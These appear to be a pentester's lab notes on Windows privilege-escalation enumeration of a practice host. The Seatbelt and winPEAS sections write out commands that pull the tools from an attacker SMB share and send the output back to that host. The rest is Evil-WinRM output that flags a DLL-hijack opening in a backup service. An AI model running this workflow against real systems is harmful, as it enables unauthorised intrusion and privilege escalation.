# Local

## Auto w/ [Seatbelt](https://github.com/GhostPack/Seatbelt)

### 転送・実行

```zsh
# Attacker
mkdir share
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/Seatbelt.exe -O share/Seatbelt.exe
impacket-smbserver -smb2support -username username -password pw share share
```
```powershell
# Target
net use \\192.168.49.104\share /user:username pw
cp \\192.168.49.104\share\Seatbelt.exe .
.\Seatbelt.exe -group=all | Tee-Object -FilePath \\192.168.49.104\share\seatbelt_result.txt
```

### 実行結果抽出

```powershell

```


## Auto w/ [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

### 転送・実行

```zsh
# Attacker
mkdir share
cp /usr/share/peass/winpeas/winPEASx64.exe share/
impacket-smbserver -smb2support -username username -password pw share share
```
```powershell
# Target
cd ~
net use \\192.168.49.104\share /user:username pw
cp \\192.168.49.104\share\winPEASx64.exe .
.\winPEASx64.exe | Tee-Object -FilePath \\192.168.49.104\share\peas_result.txt
```

### 実行結果抽出

```powershell
ÉÍÍÍÍÍÍÍÍÍÍ¹ Interesting Services -non Microsoft-
È Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services                                                                                                     
  [X] Exception: Access denied 
    Ahsay Cloud Backup Suite(Ahsay Cloud Backup Suite)[C:\Program Files\AhsayCBS\bin\cbssvcX64.exe] - Autoload - No quotes and Space detected
    File Permissions: Users [Allow: AllAccess]
    Possible DLL Hijacking in binary folder: C:\Program Files\AhsayCBS\bin (Users [Allow: AllAccess])

```

---
---

## Manual

### ユーザー

- 特に興味深い権限は持っていない
```sh
*Evil-WinRM* PS C:\Users\Sandra\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system  Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled
*Evil-WinRM* PS C:\Users\Sandra\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
*Evil-WinRM* PS C:\Users\Sandra\Desktop> 

```




---

### システム情報


---

### ネットワーク

- ftpであったdb.devのポートは動作していなさそう


---

### インストール済みアプリケーション

```powershell
*Evil-WinRM* PS C:\> # Access deninedのときは、reg query "HKLM\..."
$paths = @(
"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*","HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*")
Get-ItemProperty -Path $paths -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName } | Select-Object DisplayName, DisplayVersion, InstallLocation | Sort-Object DisplayName

DisplayName                                                        DisplayVersion  InstallLocation
-----------                                                        --------------  ---------------
Ahsay Cloud Backup Suite                                           8.1.1.50        C:\Program Files\AhsayCBS\
Argus DVR Viewer
Argus Surveillance DVR
Microsoft Edge                                                     111.0.1661.41   C:\Program Files (x86)\Microsoft\Edge\Application
...
```

- [[http - 8080]]で見つけた脆弱性を権限昇格に使える

---

### 実行中のプロセス

- WebServerForAdminというのが気になる
```sh
*Evil-WinRM* PS C:\Program Files\AhsayCBS> # 除外ワードは,"<term>"で追加可能
ps | Where-Object -Property ProcessName -notin "svchost"

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   3409      52  2349504    2069008              2716   0 cbssvcX64
    136       9     6560       6760       0.42   3040   0 conhost
    136      10     6540      12552       0.05   5476   0 conhost
    568      22     1708       4700               460   0 csrss
    172      10     1540       3988               568   1 csrss
    261      14     3832      11308               796   0 dllhost
    421      51     7188      18700               168   0 DVR
    271      12     2016       9096              2624   0 DVRWatchdog
    700      25    24652      40008               316   1 dwm
     37       6     1536       3084               812   0 fontdrvhost
     37       6     1620       2896               820   1 fontdrvhost
      0       0       60          8                 0   0 Idle
    608      33    15864      52080              4420   1 LogonUI
   1200      24     6380      14872               712   0 lsass
      0       0      328      88832              1540   0 Memory Compression
    206      12     2032        280              4812   0 MicrosoftEdgeUpdate
    306      18     9120      23160              5904   0 MoUsoCoreWorker
    224      13     2908       7968              4836   0 msdtc
    606      81   197528     114428              2444   0 MsMpEng
    141       8     1288       5028              2948   0 nfsX64
      0      12     3828      11340                92   0 Registry
    115       7     1116       5120       0.56   2916   0 rotatelogs
    746      35    17476      21120              3544   0 SearchIndexer
    275      13     3004      11960              6044   0 SecurityHealthService
    626      11     4956       9584               660   0 services
    105       7     4204       6936              5696   0 SgrmBroker
     53       3     1056        928               352   0 smss
   2031       0      196        140                 4   0 System
    481      31    22212      40708              6540   0 taskhostw
    172      11     2864       7640              2972   0 VGAuthService
    117       7     1424       5504              2980   0 vm3dservice
    116       8     1536       5896              3392   1 vm3dservice
    416      24    10364      18604              2996   0 vmtoolsd
    257      20     5792      15252              4952   0 w3wp
    475      31     6080      14940              2568   0 WebServerForAdmin
    162      11     1352       6188               560   0 wininit
    246      12     2688      18284               652   1 winlogon
   4013      36    62184      76560       6.78   4704   0 winPEASx64
    148       9     1548       8044              4640   0 WmiApSrv
    373      17    10704      19888              4032   0 WmiPrvSE
   2321      34    75396      98760       3.41   3900   0 wsmprovhost
   1071      27    61736      79612       1.08   6016   0 wsmprovhost

```

- リアルタイムにプロセス監視するも特になし
```sh
*Evil-WinRM* PS C:\Users\Sandra> powershell -ep bypass -c 'import-module .\Watch-Command.ps1;ps -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuous -Seconds 30'

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    136       9     3392       9504       0.03   2708   0 conhost
   1070      26    63928      68204       1.00   3380   0 powershell
   2043       0      196        140                 4   0 System
   1213      24     6424      15068               712   0 lsass
   1037      25    69976      75764       1.31   3380   0 powershell
    341      12     2260      10452              5864   0 SearchProtocolHost
   1318      17     8076      16760               804   0 svchost
    867      15     4648      10544               924   0 svchost
    235      10     2028       6648               976   0 svchost
    211       9     1912       6136              1272   0 svchost
    213      14    60440      61252              1400   0 svchost
    260      12     2536       7288              1924   0 svchost
    422      17    12936      21680              2604   0 svchost
    326      17    22336      26816              2736   0 svchost
    748      84    70396      57676              4560   0 svchost
   2046       0      196        140                 4   0 System
    373      17    10652      19856              4032   0 WmiPrvSE
   2086      34    75300      98876       4.02   3900   0 wsmprovhost
   1383      33    67364      87980       1.27   6016   0 wsmprovhost
   1214      24     6492      15084               712   0 lsass
    606      81   197528     114428              2444   0 MsMpEng
   1279      24    69912      75736       1.66   3380   0 powershell
    627      11     5008       9600               660   0 services
   1319      17     8076      16760               804   0 svchost
    236      10     2028       6648               976   0 svchost
    427      32     9160      15876              2112   0 svchost
    171       9     1908       6832              2120   0 svchost
    399      16    12272      21228              2604   0 svchost
    327      17    22516      26996              2736   0 svchost
    129      10     6408      12632              3532   0 svchost
    728      84    70396      57676              4560   0 svchost
    224      13     2532       9900              5340   0 svchost
    552      29     9784      17920              5516   0 svchost
   2049       0      196        140                 4   0 System
    414      24    10368      18620              2996   0 vmtoolsd
    799      34    75364      98916       4.09   3900   0 wsmprovhost
   1447      33    67380      87996       1.27   6016   0 wsmprovhost
```


---

### PowerShellログ


---

### サービス

- ARGUSSURVEIILANCEDVR_WATCHDOGがLocalSystemで実行されている
```powershell
*Evil-WinRM* PS C:\Program Files\Argus Surveillance DVR> Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\* |
  Where-Object {
    $_.ObjectName -and
    $_.ObjectName -notmatch 'LocalService|NetworkService' -and
    $_.ImagePath -and
    $_.ImagePath -notmatch '^"?C:\\Windows\\'
    # unquoted service path用
    # $_.PathName -notmatch '"'
  } |
  Select PSChildName, ImagePath, ObjectName

PSChildName                   ImagePath                                                                               ObjectName
-----------                   ---------                                                                               ----------
ahsaycbs                      C:\Program Files\AhsayCBS\bin\cbssvcX64.exe                                             .\Sandra
ARGUSSURVEILLANCEDVR_WATCHDOG C:\Program Files\Argus Surveillance DVR\DVRWatchdog.exe                                 LocalSystem
edgeupdate                    "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc              LocalSystem
edgeupdatem                   "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /medsvc           LocalSystem
MicrosoftEdgeElevationService "C:\Program Files (x86)\Microsoft\Edge\Application\111.0.1661.41\elevation_service.exe" LocalSystem
OBNfsServer                   C:\Program Files\AhsayCBS NFS\bin\nfsX64.exe                                            LocalSystem
Sense                         "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"              LocalSystem
uhssvc                        "C:\Program Files\Microsoft Update Health Tools\uhssvc.exe"                             LocalSystem
VGAuthService                 "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                  LocalSystem
VMTools                       "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                     LocalSystem
WinDefend                     "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2301.6-0\MsMpEng.exe"          LocalSystem
WUDFRd                        \SystemRoot\System32\drivers\WUDFRd.sys                                                 \Driver\..
```


---

### スケジュールタスク


---

### 興味深い情報

#### C:\



#### C:\Users -> nothing

- adminのホームは覗けない
```sh
Evil-WinRM* PS C:\Users> tree /f
Folder PATH listing
Volume serial number is 7A11-DA09
C:.
ÃÄÄÄAdministrator
ÃÄÄÄDefaultAppPool
ÃÄÄÄPublic
ÀÄÄÄSandra
    ÃÄÄÄ3D Objects
    ÃÄÄÄContacts
    ÃÄÄÄDesktop
    ³       local.txt
    ³
    ÃÄÄÄDocuments
    ³       .env
    ³       Acq.dll
    ³       DVRParams.ini
    ³       Manifest.dll
    ³       program.exe
    ³       verisign.png
    ³       wab.dll
    ³
    ÃÄÄÄDownloads
    ÃÄÄÄFavorites
    ³   ³   Bing.url
    ³   ³
    ³   ÀÄÄÄLinks
    ÃÄÄÄLinks
    ³       Desktop.lnk
    ³       Downloads.lnk
    ³
    ÃÄÄÄMusic
    ÃÄÄÄPictures
    ³   ÃÄÄÄCamera Roll
    ³   ÀÄÄÄSaved Pictures
    ÃÄÄÄSaved Games
    ÃÄÄÄSearches
    ³       winrt--{S-1-5-21-4214290425-2411352775-3126579912-1002}-.searchconnector-ms
    ³
    ÀÄÄÄVideos

```


---
---

# WinPEAS

## 記録用（結果長い）

```powershell
 [!] If you want to run the file analysis checks (search sensitive information in files), you need to specify the 'fileanalysis' or 'all' argument. Note that this search might take several minutes. For help, run winpeass.exe --help
ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
     
               ((((((((((((((((((((((((((((((((
        (((((((((((((((((((((((((((((((((((((((((((
      ((((((((((((((**********/##########(((((((((((((   
    ((((((((((((********************/#######(((((((((((
    ((((((((******************/@@@@@/****######((((((((((
    ((((((********************@@@@@@@@@@/***,####((((((((((
    (((((********************/@@@@@%@@@@/********##(((((((((
    (((############*********/%@@@@@@@@@/************((((((((
    ((##################(/******/@@@@@/***************((((((
    ((#########################(/**********************(((((
    ((##############################(/*****************(((((
    ((###################################(/************(((((
    ((#######################################(*********(((((
    ((#######(,.***.,(###################(..***.*******(((((
    ((#######*(#####((##################((######/(*****(((((
    ((###################(/***********(##############()(((((
    (((#####################/*******(################)((((((
    ((((############################################)((((((
    (((((##########################################)(((((((
    ((((((########################################)(((((((
    ((((((((####################################)((((((((
    (((((((((#################################)(((((((((
        ((((((((((##########################)(((((((((
              ((((((((((((((((((((((((((((((((((((((
                 ((((((((((((((((((((((((((((((

ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own devices and/or with the device owner's permission.

  WinPEAS-ng by @hacktricks_live

       /---------------------------------------------------------------------------------\
       |                             Do you like PEASS?                                  |
       |---------------------------------------------------------------------------------| 
       |         Learn Cloud Hacking       :     training.hacktricks.xyz                 |
       |         Follow on Twitter         :     @hacktricks_live                        |
       |         Respect on HTB            :     SirBroccoli                             |
       |---------------------------------------------------------------------------------|
       |                                 Thank you!                                      |
       \---------------------------------------------------------------------------------/

  [+] Legend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links

 You can find a Windows local PE Checklist here: https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html
   Creating Dynamic lists, this could take a while, please wait...
   - Loading sensitive_files yaml definitions file...
   - Loading regexes yaml definitions file...
   - Checking if domain...
   - Getting Win32_UserAccount info...
Error while getting Win32_UserAccount info: System.Management.ManagementException: Access denied 
   at System.Management.ThreadDispatch.Start()
   at System.Management.ManagementScope.Initialize()
   at System.Management.ManagementObjectSearcher.Initialize()
   at System.Management.ManagementObjectSearcher.Get()
   at winPEAS.Checks.Checks.CreateDynamicLists(Boolean isFileSearchEnabled)
   - Creating current user groups list...
   - Creating active users list (local only)...
  [X] Exception: Object reference not set to an instance of an object.
   - Creating disabled users list...
  [X] Exception: Object reference not set to an instance of an object.
   - Admin users list...
  [X] Exception: Object reference not set to an instance of an object.
   - Creating AppLocker bypass list...
   - Creating files/directories list for search...


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ System Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Basic System Information
È Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#version-exploits
  [X] Exception: Access denied 
  [X] Exception: Access denied 
  [X] Exception: The given key was not present in the dictionary.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing All Microsoft Updates
  [X] Exception: Creating an instance of the COM component with CLSID {B699E5E8-67FF-4177-88B0-3684A3388BFB} from the IClassFactory failed due to the following error: 80070005 Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED)).

ÉÍÍÍÍÍÍÍÍÍÍ¹ System Last Shutdown Date/time (from Registry)

    Last Shutdown Date/time        :    3/15/2023 6:16:46 AM

ÉÍÍÍÍÍÍÍÍÍÍ¹ User Environment Variables
È Check for some passwords or keys in the env variables 
    COMPUTERNAME: OSCP
    PUBLIC: C:\Users\Public
    LOCALAPPDATA: C:\Users\Sandra\AppData\Local
    PSModulePath: C:\Users\Sandra\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
    PROCESSOR_ARCHITECTURE: AMD64
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\Sandra\AppData\Local\Microsoft\WindowsApps
    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
    ProgramFiles(x86): C:\Program Files (x86)
    PROCESSOR_LEVEL: 6
    ProgramFiles: C:\Program Files
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
    USERPROFILE: C:\Users\Sandra
    SystemRoot: C:\Windows
    ALLUSERSPROFILE: C:\ProgramData
    DriverData: C:\Windows\System32\Drivers\DriverData
    ProgramData: C:\ProgramData
    PROCESSOR_REVISION: 4f01
    USERNAME: Sandra
    CommonProgramW6432: C:\Program Files\Common Files
    CommonProgramFiles: C:\Program Files\Common Files
    OS: Windows_NT
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
    ComSpec: C:\Windows\system32\cmd.exe
    SystemDrive: C:
    TEMP: C:\Users\Sandra\AppData\Local\Temp
    NUMBER_OF_PROCESSORS: 2
    APPDATA: C:\Users\Sandra\AppData\Roaming
    TMP: C:\Users\Sandra\AppData\Local\Temp
    ProgramW6432: C:\Program Files
    windir: C:\Windows
    USERDOMAIN: OSCP

ÉÍÍÍÍÍÍÍÍÍÍ¹ System Environment Variables
È Check for some passwords or keys in the env variables 
    ComSpec: C:\Windows\system32\cmd.exe
    DriverData: C:\Windows\System32\Drivers\DriverData
    OS: Windows_NT
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    PROCESSOR_ARCHITECTURE: AMD64
    PSModulePath: C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
    TEMP: C:\Windows\TEMP
    TMP: C:\Windows\TEMP
    USERNAME: SYSTEM
    windir: C:\Windows
    NUMBER_OF_PROCESSORS: 2
    PROCESSOR_LEVEL: 6
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
    PROCESSOR_REVISION: 4f01

ÉÍÍÍÍÍÍÍÍÍÍ¹ Audit Settings
È Check what is being logged 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Audit Policy Settings - Classic & Advanced

ÉÍÍÍÍÍÍÍÍÍÍ¹ WEF Settings
È Windows Event Forwarding, is interesting to know were are sent the logs 
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ LAPS Settings
È If installed, local administrator password is changed frequently and is restricted by ACL 
    LAPS Enabled: LAPS not installed

ÉÍÍÍÍÍÍÍÍÍÍ¹ Wdigest
È If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wdigest
    Wdigest is not enabled

ÉÍÍÍÍÍÍÍÍÍÍ¹ LSA Protection
È If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#lsa-protection
    LSA Protection is not enabled

ÉÍÍÍÍÍÍÍÍÍÍ¹ Credentials Guard
È If enabled, a driver is needed to read LSASS memory https://book.hacktricks.wiki/windows-hardening/stealing-credentials/credentials-protections#credentials-guard
    CredentialGuard is not enabled

ÉÍÍÍÍÍÍÍÍÍÍ¹ Cached Creds
È If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#cached-credentials
    cachedlogonscount is 10

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating saved credentials in Registry (CurrentPass)

ÉÍÍÍÍÍÍÍÍÍÍ¹ AV Information
  [X] Exception: Access denied 
    No AV was detected!!
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Windows Defender configuration

ÉÍÍÍÍÍÍÍÍÍÍ¹ UAC Status
È If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#from-administrator-medium-to-high-integrity-level--uac-bypasss
    ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries
    EnableLUA: 1
    LocalAccountTokenFilterPolicy: 1
    FilterAdministratorToken: 
      [*] LocalAccountTokenFilterPolicy set to 1.
      [+] Any local account can be used for lateral movement.

ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.19041.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: 
    PS history size: 

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating PowerShell Session Settings using the registry
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ PS default transcripts history
È Read the PS history inside these files (if any)

ÉÍÍÍÍÍÍÍÍÍÍ¹ HKCU Internet Settings
    CertificateRevocation: 1
    DisableCachingOfSSLPages: 0
    IE5_UA_Backup_Flag: 5.0
    PrivacyAdvanced: 1
    SecureProtocols: 2688
    User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
    ZonesSecurityUpgrade: System.Byte[]
    WarnonZoneCrossing: 0
    EnableNegotiate: 1
    ProxyEnable: 0
    MigrateProxy: 1

ÉÍÍÍÍÍÍÍÍÍÍ¹ HKLM Internet Settings
    ActiveXCache: C:\Windows\Downloaded Program Files
    CodeBaseSearchPath: CODEBASE
    EnablePunycode: 1
    MinorVersion: 0
    WarnOnIntranet: 1

ÉÍÍÍÍÍÍÍÍÍÍ¹ Drives Information
È Remember that you should search more info inside the other drives 
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 16 GB)(Permissions: Authenticated Users [Allow: AppendData/CreateDirectories])
    D:\ (Type: CDRom)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking WSUS
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wsus
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking KrbRelayUp
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#krbrelayup
  The system isn't inside a domain, so it isn't vulnerable

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking If Inside Container
È If the binary cexecsvc.exe or associated service exists, you are inside Docker 
You are NOT inside a container

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking AlwaysInstallElevated
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated
    AlwaysInstallElevated isn't available

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerate LSA settings - auth packages included

    auditbasedirectories                 :       0
    auditbaseobjects                     :       0
    Bounds                               :       00-30-00-00-00-20-00-00
    crashonauditfail                     :       0
    fullprivilegeauditing                :       00
    LimitBlankPasswordUse                :       1
    NoLmHash                             :       1
    Security Packages                    :       ""
    Notification Packages                :       scecli
    Authentication Packages              :       msv1_0
    LsaPid                               :       712
    LsaCfgFlagsDefault                   :       0
    SecureBoot                           :       1
    ProductType                          :       6
    disabledomaincreds                   :       0
    everyoneincludesanonymous            :       0
    forceguest                           :       0
    restrictanonymous                    :       0
    restrictanonymoussam                 :       1

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating NTLM Settings
  LanmanCompatibilityLevel    :  (Send NTLMv2 response only - Win7+ default)


  NTLM Signing Settings
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : False
      ServerNegotiateSigning  : False
      LdapSigning             : Negotiate signing (Negotiate signing)

  Session Security
      NTLMMinClientSec        : 536870912 (Require 128-bit encryption)
      NTLMMinServerSec        : 536870912 (Require 128-bit encryption)


  NTLM Auditing and Restrictions
      InboundRestrictions     :  (Not defined)
      OutboundRestrictions    :  (Not defined)
      InboundAuditing         :  (Not defined)
      OutboundExceptions      : 

ÉÍÍÍÍÍÍÍÍÍÍ¹ Display Local Group Policy settings - local users/machine

ÉÍÍÍÍÍÍÍÍÍÍ¹ Potential GPO abuse vectors (applied domain GPOs writable by current user)
    Host is not joined to a domain or domain info is unavailable.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking AppLocker effective policy
   AppLockerPolicy version: 1
   listing rules:



ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Printers (WMI)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Named Pipes
  Name                                                                                                 CurrentUserPerms                                                       Sddl

  eventlog                                                                                             Everyone [Allow: WriteData/CreateFiles]                                O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)

  ROUTER                                                                                               Everyone [Allow: WriteData/CreateFiles]                                O:SYG:SYD:P(A;;0x12019b;;;WD)(A;;0x12019b;;;AN)(A;;FA;;;SY)

  vgauth-service                                                                                       Everyone [Allow: WriteData/CreateFiles]                                O:BAG:SYD:P(A;;0x12019f;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)


ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating AMSI registered providers
    Provider:       {2781761E-28E0-4109-99FE-B9D127C57AFE}
    Path:           "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2301.6-0\MpOav.dll"

   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Sysmon configuration
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Sysmon process creation logs (1)
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Installed .NET versions



ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Interesting Events information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Printing Explicit Credential Events (4648) for last 30 days - A process logged on using plaintext credentials

      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Printing Account Logon Events (4624) for the last 10 days.

      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Process creation events - searching logs (EID 4688) for sensitive data.

      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell events - script block logs (EID 4104) - searching for sensitive data.

  [X] Exception: Attempted to perform an unauthorized operation.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Displaying Power off/on events for last 5 days

System.UnauthorizedAccessException: Attempted to perform an unauthorized operation.
   at System.Diagnostics.Eventing.Reader.EventLogException.Throw(Int32 errorCode)
   at System.Diagnostics.Eventing.Reader.NativeWrapper.EvtQuery(EventLogHandle session, String path, String query, Int32 flags)
   at System.Diagnostics.Eventing.Reader.EventLogReader..ctor(EventLogQuery eventQuery, EventBookmark bookmark)
   at winPEAS.Helpers.MyUtils.GetEventLogReader(String path, String query, String computerName)
   at winPEAS.Info.EventsInfo.Power.Power.<GetPowerEventInfos>d__0.MoveNext()
   at winPEAS.Checks.EventsInfo.PowerOnEvents()


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Users Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Users
È Check if you have some admin equivalent privileges https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#users--groups
  [X] Exception: Object reference not set to an instance of an object.
  Current user: Sandra
  Current groups: Domain Users, Everyone, Builtin\Remote Management Users, Users, Network, Authenticated Users, This Organization, Local account, NTLM Authentication
   =================================================================================================

    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current User Idle Time
   Current User   :     OSCP\Sandra
   Idle Time      :     03h:38m:40s:281ms

ÉÍÍÍÍÍÍÍÍÍÍ¹ Display Tenant information (DsRegCmd.exe /status)
   Tenant is NOT Azure AD Joined.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current Token privileges
È Check if you can escalate privilege using some enabled token https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#token-manipulation
    SeShutdownPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeRemoteShutdownPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeUndockPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeTimeZonePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED

ÉÍÍÍÍÍÍÍÍÍÍ¹ Clipboard text

